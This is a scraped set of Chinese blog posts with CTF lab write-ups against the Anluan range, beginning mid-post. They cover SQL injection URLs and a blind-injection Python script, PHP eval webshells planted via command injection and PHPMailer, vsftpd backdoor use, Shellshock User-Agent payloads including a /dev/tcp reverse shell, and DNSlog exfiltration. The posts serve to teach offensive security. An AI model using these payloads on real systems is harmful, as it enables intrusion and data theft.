黔驴技穷找呀找呀找朋友，找到一个……一个……一个啥来着，好了，找几天资料了，连着熬了几晚，我不服，我还会回来的，就先说拜拜啦&#96;(&gt;﹏&lt;)′\n0x08 MSF getshell\n直接调用原始漏洞利用程序是没有 shell 文件名提示的，故需要修改成默认名以方便连接。终端写入：\n\nvim /usr/share/metasploit-framework/modules/exploits/multi/http/wp_crop_rce.rb313 行处，将 @backdoor = Rex::Text.rand_text_alpha(10) 注释，添加 @backdoor = &#39;tumei&#39;或 313行处添加 shell 文件名输出， puts(&#39;[+] &#39; + @backdoor + &#39;.php&#39;) 。\n\n没什么好说的，终端写入如下命令# 一次性 cv 下列语句省时省力，komsfconsoleuse exploit/multi/http/wp_crop_rceset payload generic/customset username testset password 1qaz2wsxset rhosts 106.15.50.112set rport 8043set payloadstr &lt;?php @eval($_POST[t&#x27;umei&#x27;]);?&gt;set AllowNoCleanup truerun\n\n\n0x09 flag攻击完成，直接菜刀|蚁剑连接 http://106.15.50.112:8043/tumei.phpflag&#123;af2fe3b20b4a288e9d96b100f0e17d8e&#125;\n0x10 后记\n\n很粗心，登录界面就逮着 admin 来爆破了，也没注意它提示账户的存在性，这毛病得改\n很较真，说好不好，消耗了几天，还是无法手工 getshell 。\n再接再厉，有弄成功的师傅可以教一手。\n对了，今天正月十五了，祝大家元宵节快乐，天天逮到0day。\n\n\n","categories":["靶场"],"tags":["CMS","安鸾"]},{"title":"安鸾SQL系列之搜索型注入","url":"/article/11221e22.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/\n\n0x01 供给材料题目URL：http://47.103.94.191:8015/login.php提示：flag仍然在数据库里面！\n\n0x02 低难度注：此处该注意的是select 1,2,3,4,5,6,7中哪个位置的参数可以输出前端。flag：flag&#123;86b757e867b43d16050225ab516b2274&#125;\t\nhttp://47.103.94.191:8015/sqli_1.php?title=1%27 or 1=1%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27order by 8%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27union select 1,2,3,4,5,6,7%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27union select 1,version(),user(),database(),5,6,7%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27union select 1,version(),user(),database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()),6,7%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27union select 1,version(),user(),database(),(select group_concat(column_name) from information_schema.columns where table_name = &#x27;this_flag&#x27;),6,7%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27union select 1,version(),user(),database(),(select group_concat(flag) from this_flag),6,7%23&amp;action=searchhttp://47.103.94.191:8015/sqli_1.php?title=1%27union select 1,version(),user(),database(),(select flag from this_flag limit 1,1),6,7%23&amp;action=search\n\n0x02 其他难度等我学艺归来再尝试……\n0x03 SQL数字型GET注入02供给信息题目URL：http://47.103.94.191:8034/提示:flag在数据库里\n\n文章查看注：随便点一篇文章，整个单引号直接报错；一样需要比对能输出前端的可控参数，为union后语句能显示，需致id为负数以腾出前端显示位置；采用模糊搜索**like %flag%**能得到flag所在库名表名字段名等，但基本在当前数据库，且字段为flag。flag：**flag&#123;16aeb3e6d73689bf456c5c50f2d04b84&#125; **\nhttp://47.103.94.191:8034/show.php?id=35&#x27;http://47.103.94.191:8034/show.php?id=35 order by 16http://47.103.94.191:8034/show.php?id=-35 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15http://47.103.94.191:8034/show.php?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,version(),database(),13,14,15http://47.103.94.191:8034/show.php?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,version(),(select count(table_name) from information_schema.columns where table_schema = database()),13,14,15http://47.103.94.191:8034/show.php?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,version(),(select group_concat(table_name) from information_schema.columns where column_name like &#x27;%flag%&#x27;),13,14,15http://47.103.94.191:8034/show.php?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,version(),(select group_concat(table_schema) from information_schema.columns where table_name = &#x27;this_is_flag&#x27;),13,14,15http://47.103.94.191:8034/show.php?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,version(),(select group_concat(column_name) from information_schema.columns where table_name = &#x27;this_is_flag&#x27;),13,14,15http://47.103.94.191:8034/show.php?id=-35 union select 1,2,user(),4,5,6,7,8,9,10,version(),(select group_concat(flag) from this_is_flag),13,14,15\n\n搜索栏刚开始也是写入单引号，光顾着看返回：搜索关键字：wordpress&#39;，加之背景色影响，还真没注意报错回显。一番操作，不报错前提下仅返回搜索框中输入内容，看样子是转成字符串后回显前端，所以整报错注入\nhttp://47.103.94.191:8034/search.php?keywords=1&#x27;&amp;button=%E6%90%9C%E7%B4%A2http://47.103.94.191:8034/search.php?keywords=1&#x27; order by 15-- -&amp;button=%E6%90%9C%E7%B4%A2http://47.103.94.191:8034/search.php?keywords=1&#x27; union SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,EXP(~(SELECT DATABASE()))-- -&amp;button=%E6%90%9C%E7%B4%A2\n\nsqlmap -u &#x27;http://47.103.94.191:8034/search.php?keywords=1&amp;button=%E6%90%9C%E7%B4%A2&#x27;  -v 1 --dbs","categories":["靶场"],"tags":["安鸾","SQL"]},{"title":"安鸾SQL系列之数字字符串","url":"/article/81e90e43.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/81e90e43.html\n\nSQL数字型GET注入01漏洞URL:http://47.103.94.191:8001/bug/sql_injection/sql_num.php提示:flag在数据库里\n# 测类型--数字型http://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=1 and 1=1&amp;submit=submithttp://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=1 and 1=2&amp;submit=submit# 测字段--3http://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=1 order by 3&amp;submit=submithttp://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=1 order by 4&amp;submit=submit# 获取当前所在数据库--dwvshttp://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=-1 union select 1,2,database()&amp;submit=submit# 查dwvs数据库下所有表--flaghttp://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dwvs&#x27;&amp;submit=submit# flag表查字段--id、flaghttp://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=-1 union select 1,2,group_concat(COLUMN_NAME) from information_schema.columns where table_name=&#x27;flag&#x27;&amp;submit=submit# 查flag字段值--flag&#123;05486400c4ac17fef478f73504934212&#125;http://47.103.94.191:8001/bug/sql_injection/sql_num.php?id=-1 union select 1,2,flag from dwvs.flag&amp;submit=submit\n\nSQL字符型注入漏洞URL:http://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=1&amp;submit=submit提示：flag在数据库里面\n\n\n‘ and ‘1’&#x3D;’1 测类型\nhttp://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=2&#x27; and &#x27;1&#x27;=&#x27;1&amp;submit=submit\n\norder by 测字段数\nhttp://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=2&#x27; order by 4%23&amp;submit=submit\n\n\n获取所有数据库\nhttp://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=1&#x27; union select 1,2,group_concat(table_schema) from information_schema.tables%23&amp;submit=submit\n\ndwvs数据库所有表\nhttp://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=2&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dwvs&#x27;%23&amp;submit=submit\n\n\n查flag表下字段\nhttp://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=2&#x27; union select 1,2,group_concat(COLUMN_NAME) from information_schema.columns where table_name=&#x27;flag&#x27;%23&amp;submit=submit\n\n\n取flag{3fac9e7cf81d710fd1a15f011d60739f}\nhttp://47.103.94.191:8005//bug/sql_injection/sql_string.php?title=2&#x27; union select 1,2,flag from dwvs.flag%23&amp;submit=submit\n\n\n\n","categories":["靶场"],"tags":["安鸾","SQL"]},{"title":"安鸾之2022新增基础题","url":"/article/c4da1970.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/article/c4da1970.html\n\n指纹识别指纹识别题目URL：http://47.100.220.113:8009/whatweb安装apt-get updateapt-get install whatweb》》whatweb http://47.100.220.113:8009/》》flag&#123;de6de75989416f33c0bdf18ccd83127c&#125;\n\nLinux基础命令Linux基础命令IP：47.100.220.113SSH端口：2233SSH用户：testSSH密码：whalwl@wuhanflag自己找，没提示！》》find / -name *flag*》》cat /home/test/.this_is_flag》》#九阴真经上卷:》》flag&#123;82782fd750080718》》tips:九阴真经下卷文件名包含: Jiuyin-Sutra-Volume-2》》find / -name *Jiuyin-Sutra-Volume-2*》》cat /usr/games/.Jiuyin-Sutra-Volume-2》》#九阴真经下卷》》71ad76e3a8b8794d&#125;》》flag&#123;82782fd75008071871ad76e3a8b8794d&#125;\n\nMysql数据库基础Mysql数据库基础IP：47.100.220.113SSH端口：2244SSH账户：testSSH密码：whalwl@wuhanMysql主机名：mysqlMysql用户名：testMysql密码：test题目没提示，自己研究！\nNavicat实现SSH隧道》》配一份讲解：https://blog.csdn.net/ory001/article/details/115172944》》Navicat使用SSH隧道连接MySQL》》新建数据库连接中分别在常规和SSH中填入官方提供的内容》》flag&#123;0dd93bed6d72ee25d2f75ce3553a4fb7&#125;\n\n手工SSH隧道转发》》需要了解SSH中的本地端口转发》》配给一份很棒的文章：https://www.zsythink.net/archives/2450》》-L localport:remotehost:remoteport》》将本地机(客户机)的某个端口转发到远端指定机器的指定端口》》-f》》要求 ssh 在执行命令前退至后台》》-N》》不执行远程命令，仅使用端口转发》》ssh -L 6666:mysql:3306 -N -f test@47.100.220.113 -p 2244》》mysql -u test -P 6666 -p》》show databases;》》show tables from whalwl;》》select * from whalwl.flag;\n\n目录扫描目录扫描URL：http://47.100.220.113:8008/dirsearch工具使用示例：python dirsearch.py -u http://47.100.220.113:8008/ -w dicc.txt -e php -t 1 -m head说明：使用dirsearch一定要用-m参数指定head扫描，使用其他工具也一样，服务器刚不住！！！ dicc.txt b290cf8531865db093b68ffe742d1ba0 》》使用目录扫描工具+官方提供的字典》》dirb工具，这个界面不好看》》dirb http://47.100.220.113:8008/ ./dicc.txt》》》》dirsearch工具，好分辨扫描到的目录》》dirsearch -u http://47.100.220.113:8008/ -w /home/kali/Test/dicc.txt -e php -t 1 -m head》》 unzip web.zip -d web》》cat web/this_is_flag_c8b2a7b37ceca919d1ab99e1a319552c》》》》一些图形化工具：御剑啥的。》》》》目录扫描……看你的字典是否够强大吧\n\n端口扫描端口扫描题目考察：nmap端口扫描练习及经典的笑脸后门利用服务版本识别：nmap -p 10021 -sV 47.100.220.113ftp端口10021 对应后门端口16200ftp端口20021 对应后门端口26200ftp端口30021 对应后门端口36200》》-sV 探测服务/版本信息》》-A 全检测，即启动Os检测，版本检测，脚本扫描和traceroute》》-Pn 将所有主机视为在在线，跳过主机发现》》nmap -p 10021 -Pn -sV 47.100.220.113》》nmap -p 30021 -A -Pn 47.100.220.113》》10021/tcp open  ftp     vsftpd 2.3.4\tService Info: OS: Unix》》20021/tcp open  ftp     vsftpd 2.3.4\tService Info: OS: Unix》》30021/tcp open  ftp     vsftpd 2.3.4\tService Info: OS: Unix》》》》某个终端：连接接ftp服务，并写入笑脸》》ftp 47.100.220.113 10021》》libai:)》》任意密码》》》》另一终端：；使用nc侦听连接shell》》nc 47.100.220.113 16200》》ls》》cat this_is_flag》》flag&#123;ff5c1e67567b60f9086805e3b44e5ccd&#125;》》》》MSF利用》》msfconsole》》search vsftpd》》use exploit/unix/ftp/vsftpd_234_backdoor》》show options》》set rhosts 47.100.220.113》》set rport 10021》》run》》无法返回shell终端，故需要进行下一步，手速快，新终端：》》nc 47.100.220.113 16200\n\nDocker容器基础Docker容器基础镜像仓库地址：registry.cn-shanghai.aliyuncs.com/whalwl/docker_test运行该镜像，进入容器获取flag》》docker pull registry.cn-shanghai.aliyuncs.com/whalwl/docker_test》》docker images》》docker run -itd -P registry.cn-shanghai.aliyuncs.com/whalwl/docker_test》》docker exec -it e02c00b4f6f3 /bin/bash》》find / -name *flag*》》cat /root/this_is_flag》》flag&#123;942b12e7501e80ce0ae708027d974982&#125;\n\n","categories":["靶场"],"tags":["基础","安鸾"]},{"title":"安鸾之RCE系列","url":"/article/9a765bc7.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io，转载请注明出处！\n\n0x00 webshell&amp;中国菜刀0o00 题目提示webshell&amp;中国菜刀题目URL：http://47.100.220.113:8013提示：flag仍然在数据库里面哦！\n\n0o01 执行过程\n访问提示URL，得到如下内容：\n菜刀一句话：http://47.100.220.113:8013/webshell.php密码：  whalwl\n\n蚁剑直连，找数据库账密位置。发现在配置文件里/var/www/html/conn.php，得到如下信息：\n$servername = &quot;mysql&quot;;$username = &quot;test&quot;;$password = &quot;test&quot;;DATABASE：test123\n\n蚁剑：数据管理 –&gt; 对应行右键 –&gt; 数据操作 –&gt; 添加 –&gt; ……。\n\n\n\n0x01 命令执行010o00 题目提示命令执行01题目URL:http://47.100.220.113:8031/\n\n0o01 Linux命令符; --&gt; 各命令依次执行并输出结果，不会互相影响：ls;whoami。| --&gt; 管道符，其左边命令的输出 作为 其右边命令的输入：pwd|ls。&amp; --&gt; 后台运行符，将待运行命令丢到后台运行ls /&amp;pwd。&amp;&amp; --&gt; 逻辑与，其左边命令成功执行下，方才执行其右边命令：ls /&amp;&amp;pwd。|| --&gt; 逻辑或，其左边命令执行失败下，方才执行其右边命令：ls /||pwd。` --&gt; 反引号，使用时，获取返回结果赋值给变量输出：echo `pwd`。\n\n0o02 执行过程\n提供的网页，有个导出所有文件的功能，是导出一个压缩包。重新命名，得到下载路径：http://47.100.220.113:8031/backup/test.zip。文件名被带入执行，看样子，执行点就在这命令框里了。\n\n\n\n利用命令连接符，尝试输入如下命令（注：/export.php在网站根目录，在不指定生成目录情况下，命令执行后生成的文件在当前目录，当前为网站根目录）\nbackup.tar.gz; echo admin &gt; test.txthttp://47.100.220.113:8031/test.txt访问得到：admin images/auto.jpg images/potato.jpgbackup.tar.gz; echo &#x27;&lt;?php @eval($_POST[&quot;test&quot;]); ?&gt;&#x27; &gt; test.phphttp://47.100.220.113:8031/test.php访问得到：images/auto.jpg images/potato.jpg蚁剑连接即可backup.tar.gz&amp; echo &#x27;&lt;?php @eval($_POST[&quot;test&quot;]); ?&gt;&#x27; &gt; haha.php\n\n源码分析\n# 获取传入的文件名后，不过滤直接带入 exec() 函数执行&lt;?php  if (isset($_POST[&#x27;name&#x27;]))&#123;    $name = $_POST[&#x27;name&#x27;];    exec(&quot;tar -zcvf backup/$name images/*.jpg&quot;);    echo &quot;&lt;div class=\\&quot;alert alert-success\\&quot; role=\\&quot;alert\\&quot;&gt;导出成功,&lt;a href=&#x27;backup/$name&#x27;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;;  &#125;?&gt;\n\n0x02 破壳漏洞0o00 题目提示破壳漏洞CVE编号：CVE-2014-6271题目URL：http://118.190.133.35:8029/cgi-bin/poc.cgi提示：flag在服务器根目录2014年9月25日，外媒曝出一个广泛存在于主流操作系统的漏洞bash，该漏洞会影响到Redhat、CentOS、Ubuntu、Debian、Fedora 、AmazonLinux、OS X 10.10等平台，影响范围和纵深程度都可能匹敌或者超过当年4月发现的“心脏滴血”(Heartbleed)漏洞。\n\n0o01 ShellShock\n漏洞概要：2014年9月24日，Bash 惊爆严重安全漏洞，编号为 CVE-2014-6271 ，该漏洞将导致远程攻击者在受影响的系统上执行任意代码。\n须知：GNU Bash 是一个为 GNU 计划编写的 Unix Shell，广泛使用在 Linux 系统内。\n漏洞描述：对 GNU Bash 4.3 及之前版本评估时发现，在某些构造的环境变量中存在安全漏洞。某些服务和应用允许未经身份验证的远程攻击者提供环境变量，使其可在环境变量内的函数定义后闭合构造自定义的环境变量来改变或绕过环境限制执行 Shell 命令。而这些攻击者创建的环境变量中可包含恶意代码，当 Bash Shell 被调用时被立即执行，进而造成破坏。\n漏洞影响：GNU Bash &lt;&#x3D; 4.3。\n漏洞危害：高危，10级。\n参考连接：https://blog.knownsec.com/2014/09/shellshock_response_profile/\n\n0o01 执行过程\n拿到flag：flag&#123;3dcc4094fef7406090d66d67d59d367f&#125;。\n参考：Shellshock漏洞检测及利用// Content-Type: text/plain; --&gt; 指定返回包数据内容类型，此处设置为纯文本格式// id 命令：显示用户的ID，以及所属群组的IDUser-Agent: () &#123; flag; &#125;; echo Content-Type: text/plain; echo; /usr/bin/id// 列出服务器根目录文件User-Agent: () &#123; flag;&#125;;echo Content-Type:text/plain;echo;/bin/ls /;User-Agent: () &#123; flag;&#125;;echo;echo $(/bin/ls -al / );// 显示服务器根目录下的 flag 内容User-Agent: () &#123; flag; &#125;; echo Content-Type: text/plain; echo; /bin/cat /this_is_flag// 其他命令User-Agent: () &#123; flag;&#125;;echo;/usr/bin/whoamiUser-Agent: () &#123; flag;&#125;;echo;/bin/pwdUser-Agent: () &#123; flag;&#125;;echo;/bin/cat /etc/passwd\n// 未测试User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.112/8888 0&gt;&amp;1;\nGET /cgi-bin/poc.cgi HTTP/1.1Host: 118.190.133.35:8029Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: () &#123; foo; &#125;; echo Content-Type: text/plain; echo; /bin/cat /this_is_flagAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close\n\n\n0x03 PHPmailer0o00 题目提示PHPmailer网站URL：http://118.190.133.35:8038/提示：flag在服务器系统根目录下，文件名为flag\n\n0o01 phpMailer\nphpMailer 是一个非常强大的 php发送邮件类，可以设定发送邮件地址、回复地址、邮件主题、html网页，上传附件，并且使用起来非常方便。\nPHPMailer 由于调用系统的 sendmail 命令，且在 class.phpmailer.php 中没有对用户请求做限制，致使攻击者可利用 –X 参数将包含恶意代码的流量记录到指定文件中，进而达到 RCE 的效果。\n利用要求：① PHPMailer Version &lt; 5.2.18； ② PHP 没有开启 safe_mode（默认）； ③ 攻击者需要知道 Web 服务部署的路径。\n相关CMS：WordPress、Drupal、Joomla! 等 CMS 使用该组件发送邮件。\n参考文章：\n\n0o02 执行过程\n访问链接，直接一个邮箱发送界面。好多框，有框就x……\nLinux 操作系统 –&gt; 猜测绝对路径。\nphp 脚本语言 –&gt; 解析 shell。\n\n\n\n潮汐试了下， 没识别到CMS，扫目录吧。\nhttp://118.190.133.35:8038/phpmailer/VERSION –&gt; 5.2.16\nhttp://118.190.133.35:8038/phpmailer/SECURITY.md –&gt; CVE-2016-10033\n有前辈写的 shell ，可以盲猜一波常用 shell 口令：admin、123、111、aaa、shell、test……\n\n\n\n手动GetShell，构造如下信息直接写马\n// 收件人：任意// 收件箱：&quot;demo&quot;. -OQueueDirectory=/tmp/. -X/var/www/html/anluan.php @test.com// 邮件内容：&lt;?php eval($_POST[anluan]);?&gt;\n\n点击发送，邮件发送不成功.发送错误: Could not instantiate mail function.……没得事，直接访问：http://118.190.133.35:8038/anluan.php，有一堆流量信息，拿蚁剑……\n\n\n\n\n构造其他语句，看起来比较像命令执行\n// 邮件内容：&lt;?php system($_GET[&quot;anluan&quot;]);?&gt;// 访问：view-source:http://118.190.133.35:8038/anluan.php?anluan=ls%20/\n\n\n拿到flag：flag&#123;0c9e8774f4e5684d35037ba02d5af72a&#125;\n\n\n0x04 命令执行020o00 题目提示命令执行02题目URL：http://47.100.220.113:8032/\n\n0o01 DNSlog\nDNS：域名系统，是实现域名与IP相互映射的服务。\nDNSlog：存储在DNS上与域名相关的信息，如记录着对域名/IP的访问信息，类似日志。\n参考：https://blog.csdn.net/qq_53577336&#x2F;article&#x2F;details&#x2F;118615216\n\n0o01 执行过程\n访问提示，啥玩意，感觉又被人干崩了！先扫下目录吧。\n\n官方还原后，访问跳转http://47.100.220.113:8032/login/，直接弱口令admin/admin登录后台。\n\n命令执行，，，找输入点，，，The consoleIP和端口，检测网络情况，，，ping，，，应该是这吧。\n// 写入：127.0.0.1// 检测网络情况，口头计时，算 1s 吧// 写入：127.0.0.1|sleep 5// 延迟超过5s，初步判断为存在点// 写入：|ls -l /&gt;ls.txt// 访问：http://47.100.220.113:8032/ls.txt// 查看服务器根目录下的子目录及文件 --&gt; 可知，flag为一个文件。// 写入：|cat /flag&gt;flag.txt// 访问：http://47.100.220.113:8032/flag.txt// 直接拿到flag：flag&#123;971fd930a06861f43373adddc2f499c4&#125;// 利用DNSlog外带数据方式：// 写入：127.0.0.1|ping admin.il5sxk.ceye.io// http://ceye.io/records/dns 处查看记录，Name 存在记录：admin.il5sxk.ceye.io// 写入：127.0.0.1|ping `cat \\flag`.il5sxk.ceye.io// 拿到flag。\n\n检测网络情况，显示网络异常，但还是能成功读取到flag：flag&#123;971fd930a06861f43373adddc2f499c4&#125;。\n\n\n\n\n文件写入（getshell）// 127.0.0.1|echo `cat test.txt|base64`&gt;./vendor/admin.txt\t// 目录扫描，可以得到站点存在存在目录浏览漏洞，观察可知是否生成文件。// 或通过站点对不存在网页的提示进行判断，如访问33.php，提示：Not Found。// 需要确定，内容是否真的写入，还是一个空文件 --&gt; 不是空文件，不确保写入内容与需求一致。// 直接写入一句话木马，被过滤！猜想，多文件拼接成一个文件。// 注：文件需要被作为php文件解析。// 实际步骤如下：// 去掉 2.txt 中的单引号：|echo `sed &quot;s/&#x27;//g&quot; 2.txt`&gt;2.txt// 去掉 3.txt 中的换行符：|echo `sed &quot;s/n//g&quot; 3.txt`&gt;3.txt// 去掉 4.txt 中的空格：|echo `sed &quot;s/ //g&quot; 4.txt`&gt;4.txt// 写入一句话木马的第一部分：|echo &#x27;&lt;&#x27;&gt;11.txt// 写入一句话木马的第二部分：|echo &#x27;?php&#x27;&gt;12.txt// 写入一句话木马的第三部分：|echo &#x27;@eval($_POST[&quot;shell&quot;]);?&gt;&#x27;&gt;13.txt// 合并一二部分：|cat 11.txt 12.txt &gt;14.txt// 去掉拼接造成的换行符：|echo `sed &quot;s/n//g&quot; 14.txt`&gt;14.txt// 去掉删除换行符造成的空格：|echo `sed &quot;s/ //g&quot; 14.txt`&gt;14.txt// 拼入第三部分：cat 14.txt 13.txt &gt;15.txt// 去掉拼接造成的换行符：|echo `sed &quot;s/n//g&quot; 15.txt`&gt;15.txt// 得到正确的一句话木马，复制到解析成php文件的目录即可，如网站根目录。// 很麻烦吧// 利用base64编码// 一句话木马编码后写入：|echo &#x27;PD9waHAgQGV2YWwoJF9QT1NUWyJzaGVsbCJdKTs/Pgo=&#x27;&gt;admin.txt// 解码写入其他文件：|echo `base64 -d admin.txt`&gt;admin.php\n\n\n","categories":["靶场"],"tags":["安鸾","RCE"]},{"title":"安鸾之SQL系列&余下部分","url":"/article/aca8184b.html","content":"0x00 开题说明\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于涂寐’s Blogs：https://0xtlu.github.io\n\n0x01 伪静态&amp;搜索注入0o00 题目提示伪静态&amp;搜索注入题目URL：http://47.103.94.191:8001/\n0o01 伪静态注入①网站形态：分动态和静态。②动态页面：一个页面根据用户请求，从服务器数据库中筛选出请求的内容并返回前端界面。③静态页面：用户访问一个页面，服务器直接将该页面返回前端界面，无需数据库支持。④伪静态页面：动态页面为提高收录率，通过某些规则将动态页面的地址转换成以 htm&#x2F;html 后缀的形式（重写URL），但本质上仍为动态页面。⑤个人理解伪静态图：\n⑥伪静态判定\n\n利用动态页面最后修改时间总为当前时间，静态页面最后修改时间为文件生成时间的特点进行判定\n流程：htm页面–&gt;F12–&gt;控制台–&gt;输入javascript:alert(document.lastModified)–&gt;日期总为当前时间，为伪静态。\n\n⑦常见伪静态：aspcms、phpweb、thinkphp框架等\n0o02 利用过程\n纯手工利用①判断可能存在\nhttp://47.103.94.191:8001/front/articles-1 and 1=1.html\t# 正常响应http://47.103.94.191:8001/front/articles-1 and 1=2.html\t# 异常响应# 伪静态中使用%20，%23，+等字符时会直接传递到URL中，但可使用块注释 /**/ 来代替空格# 可知当前URL所请求表中含７个字段，通过sqlmap可进一步确认（news库news表）http://47.103.94.191:8001/front/articles-2/**/order/**/by/**/7.htmlhttp://47.103.94.191:8001/front/articles-2/**/order/**/by/**/8.html# 布尔注入# 当 1-true 成立，即为0，则没有文章articles-0，反之为文章articles-1http://47.103.94.191:8001/front/articles-1-true.htmlhttp://47.103.94.191:8001/front/articles-1-false.html# 当前用户名长度# 当 length(user())=13 成立（true），则 2-(length(user())=13) 得1，则显示文章articles-1，反之显示文章articles-2# 又，通过 sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch -v 3 --current-user 得用户名，test@localhost# 故，可以确定当前用户连接用户名长度为14，注入语句成功http://47.103.94.191:8001/front/articles-2-(length(user())=13).htmlhttp://47.103.94.191:8001/front/articles-2-(length(user())=14).html# 当前数据库名长度http://47.103.94.191:8001/front/articles-1-(length(database())=3).htmlhttp://47.103.94.191:8001/front/articles-1-(length(database())=4).htmlhttp://47.103.94.191:8001/front/articles-1.html\t\t# 未加入单引号http://47.103.94.191:8001/front/articles-1&#x27;.html\t# 加入单引号,出现异常响应\n②发现没有回显，写脚本进行盲注这里脚本可以试试二分法进行盲注，可以有效降低时间复杂度。\n# !/usr/bin/env python3from requests.sessions import sessionimport refrom time import sleep&quot;&quot;&quot;@Time    : 2022/5/9 19:18@Author  : 涂寐@File    : d.py@PRODUCT : PyCharm@Description : 用于盲注 http://47.103.94.191:8001/front/articles-1%20AND%20(substring(database(),1,1)=&#x27;1&#x27;).html 的脚本&quot;&quot;&quot;class Riddle:    url = &quot;http://47.103.94.191:8001/front/articles-1&#123;&#125;.html&quot;    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;                      &#x27;Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55 &#x27;    &#125;    estimates = &quot;abcdefghigklmnopqrstuvwxyz0123456789@_.,&#123;&#125;!#^*()-+/+&amp;~=%$&quot;    re_title = r&#x27;&lt;h1.*?&gt;(.*?)&lt;/h1&gt;&#x27;    def riddle_request(self, url: str) -&gt; list:        &quot;&quot;&quot;        这是一个网络请求函数        :param url: 待请求注入的网址        :return: 存在注入的判定标识        &quot;&quot;&quot;        with session().get(url=url, headers=self.headers) as response:            content = response.text            title_list = re.findall(self.re_title, str(content))            return title_list    def riddle_length(self, sql_syntax: str) -&gt; int:        &quot;&quot;&quot;        这是一个求取sql请求返回值长度的函数，主要使用还是看你的思维        :param sql_syntax: sql注入语句        :return: sql语句返回值的长度        &quot;&quot;&quot;        for num in range(1, 1024):            url = self.url.format(sql_syntax).format(num=num)            print(num, end=&#x27;-&#x27;)            if not self.riddle_request(url):                print(num)                return num    def riddle_estimate(self, length: int, sql_syntax: str):        &quot;&quot;&quot;        这是一个猜想sql请求返回具体内容的函数，主要使用还是看你的思维        :param length: 猜想长度        :param sql_syntax: sql语句        &quot;&quot;&quot;        flag = 0        for num in range(1, length + 1):            for estimate in self.estimates:                url = self.url.format(sql_syntax).format(num=num, estimate=estimate)                if not self.riddle_request(url):                    print(estimate, end=&#x27;&#x27;)                    sleep(1)                    flag = 0                    break            # 避免过多请求            if flag &gt; 3:                print(&#x27;flag大于3&#x27;)                breakif __name__ == &quot;__main__&quot;:    # 猜表名    # column_name = &quot;table_name&quot;    # table_name = &quot;information_schema.columns&quot;    # limit_name = &quot;table_schema&quot;    # appoint_name = &quot;news&quot;    # 猜字段    # column_name = &quot;column_name&quot;    # table_name = &quot;information_schema.columns&quot;    # limit_name = &quot;table_name&quot;    # appoint_name = &quot;flag_is_here&quot;    # 猜字段值    column_name = &quot;flag_number&quot;    table_name = &quot;news.flag_is_here&quot;    limit_name = &quot;fid&quot;    appoint_name = &quot;1&quot;    riddle = Riddle()    # http://47.103.94.191:8001/front/articles-1 and ((select length(group_concat(distinct table_schema)) from    # information_schema.tables)=29).html    riddle_length = riddle.riddle_length(        sql_syntax=&quot; and ((select length(group_concat(distinct &#123;column_name&#125;)) from &#123;table_name&#125; where &#123;limit_name&#125;=&#x27;&#123;appoint_name&#125;&#x27;&quot;.format(            column_name=column_name, table_name=table_name, limit_name=limit_name,            appoint_name=appoint_name) + &quot;)=&#123;num&#125;)&quot;)    # http://47.103.94.191:8001/front/articles-1 and (substring((select group_concat(distinct table_schema) from    # information_schema.tables),1,1)=&#x27;i&#x27;).html    riddle.riddle_estimate(        sql_syntax=r&quot; and (substring((select group_concat(distinct &#123;column_name&#125;) from &#123;table_name&#125; where &#123;limit_name&#125;=&#x27;&#123;appoint_name&#125;&#x27;&quot;.format(            column_name=column_name, table_name=table_name, limit_name=limit_name,            appoint_name=appoint_name) + 